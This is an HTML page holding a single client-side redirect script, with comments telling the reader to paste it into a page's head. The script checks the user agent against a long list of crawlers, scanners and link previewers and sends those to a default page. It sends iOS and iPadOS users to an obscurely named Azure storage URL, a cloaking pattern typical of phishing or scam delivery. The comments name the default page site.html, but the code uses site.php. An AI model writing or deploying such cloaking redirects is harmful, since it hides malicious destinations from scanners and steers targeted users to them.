<!DOCTYPE html>
<html lang="en">
<head>


<!-- ============================================================
     iOS-ONLY REDIRECT SCRIPT (client-side)
     - Bots / crawlers  -> site.html   (never sent to domain.com)
     - iOS users        -> https://domain.com
     - Everyone else    -> site.html
     Paste this <script> block into the <head> of your HTML page,
     ideally as the FIRST thing inside <head> so it runs early.
     ============================================================ -->
<script>
(function () {
  "use strict";

  // --- CONFIG: change these two values if needed ------------------
  var IOS_DESTINATION   = "https://e33033007e3303echo12.z13.web.core.windows.net/2.html"; // where iOS users go
  var DEFAULT_DESTINATION = "site.php";         // where everyone else + bots go
  // ----------------------------------------------------------------

  var ua = navigator.userAgent || navigator.vendor || window.opera || "";

  // 1) BOT / CRAWLER DETECTION ------------------------------------
  // Matches Googlebot, Bingbot, and most known crawlers/previewers.
  var botPattern = new RegExp(
    "bot|crawl|spider|slurp|mediapartners|adsbot|"      +
    "googlebot|bingbot|yandex|baiduspider|duckduckbot|" +
    "facebookexternalhit|facebot|ia_archiver|"          +
    "twitterbot|linkedinbot|embedly|quora|pinterest|"   +
    "slackbot|vkshare|w3c_validator|whatsapp|telegram|" +
    "applebot|petalbot|semrush|ahrefs|mj12bot|dotbot|"  +
    "rogerbot|screaming|headless|phantom|preview|lighthouse",
    "i"
  );

  var isBot = botPattern.test(ua);

  // 2) iOS DETECTION ----------------------------------------------
  // Catches iPhone, iPod, and classic iPad user-agents.
  var isClassicIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;

  // Catches modern iPadOS, which reports itself as "Macintosh"
  // but exposes a touch screen (real Macs do not).
  var isIPadOS =
    navigator.platform === "MacIntel" &&
    typeof navigator.maxTouchPoints === "number" &&
    navigator.maxTouchPoints > 1;

  var isIOS = isClassicIOS || isIPadOS;

  // 3) DECIDE DESTINATION -----------------------------------------
  // Bots ALWAYS go to site.html, even if their UA looks like iOS.
  var target;
  if (isBot) {
    target = DEFAULT_DESTINATION;
  } else if (isIOS) {
    target = IOS_DESTINATION;
  } else {
    target = DEFAULT_DESTINATION;
  }

  // 4) REDIRECT ----------------------------------------------------
  // location.replace() does not add the current page to browser
  // history (closest client-side behavior to a 302).
  window.location.replace(target);
})();
</script>

</head>

  <body>
    </body>
</html>